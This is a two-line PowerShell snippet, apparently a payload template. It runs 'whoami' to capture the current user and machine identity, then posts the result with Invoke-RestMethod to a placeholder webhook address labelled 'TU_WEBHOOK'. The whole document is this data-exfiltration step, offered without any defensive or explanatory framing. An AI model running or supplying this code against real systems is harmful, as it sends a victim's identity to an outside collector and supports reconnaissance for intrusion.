$info = whoami
Invoke-RestMethod -Uri "TU_WEBHOOK" -Method Post -Body $info
